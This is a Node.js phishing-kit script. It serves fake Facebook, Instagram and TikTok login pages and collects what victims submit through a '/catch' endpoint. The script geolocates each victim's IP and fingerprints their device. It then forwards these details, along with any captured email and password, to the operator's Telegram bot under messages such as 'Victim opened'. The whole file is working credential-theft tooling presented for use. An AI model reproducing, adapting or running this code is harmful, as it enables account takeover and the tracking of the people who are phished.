#!/usr/bin/env node
require('dotenv').config()
const {Telegraf}=require('telegraf')
const express=require('express')
const axios=require('axios')
const ua=require('ua-parser-js')
const readline=require('readline')

const rl=readline.createInterface({input:process.stdin,output:process.stdout})
const ask=q=>new Promise(res=>rl.question(q,ans=>res(ans)))

const PAGES={
  fb:'https://mosmanhacker.github.io/fb',
  ig:'https://YOUR_2ND.github.io/ig',
  tt:'https://YOUR_2ND.github.io/tt'
}

async function main(){
  const TOKEN=process.env.BOT_TOKEN||await ask('BOT_TOKEN: ')
  const MASTER=process.env.MASTER_ID||await ask('MASTER_ID: ')
  require('fs').writeFileSync('.env',`BOT_TOKEN=${TOKEN}\nMASTER_ID=${MASTER}`)
  rl.close()

  const bot=new Telegraf(TOKEN)
  const app=express()
  app.use(express.urlencoded({extended:true}))

  bot.telegram.sendMessage(MASTER,`Successful connection..!`).catch(()=>{})

  console.log('\n1- Facebook\n2- Instagram\n3- TikTok')
  const c=(await ask('Select page (1-3): ')).trim()
  const p=['fb','ig','tt'][c-1]||'fb'
  const ext=`${PAGES[p]}/?id=${MASTER}`
  const int=`http://localhost:3000/${p}`
  console.log(`\nExternal: ${ext}\nInternal: ${int}\n`)

  app.post('/catch',async(q,r)=>{
    const{id,email,pass,ua:s,ip}=q.body
    const dev=ua(s)
    const geo=await axios.get(`http://ip-api.com/json/${ip}`).catch(()=>({data:{}}))
    const msg=
      `🔥 Victim opened\n`+
      `Platform: ${p}\n`+
      `IP: ${ip}\n`+
      `Country: ${geo.data.country||'?'}\n`+
      `Device: ${dev.os.name||'?'} ${dev.device.model||''}\n`+
      `Browser: ${dev.browser.name||'?'}`
    await bot.telegram.sendMessage(id,msg).catch(()=>{})
    if(email&&pass){
      await bot.telegram.sendMessage(id,`✅ Login: ${email}:${pass}`).catch(()=>{})
    }
    r.sendStatus(200)
  })

  bot.launch()
  app.listen(3000,()=>console.log('Running... (Ctrl+C to stop)\n'))
}
main()
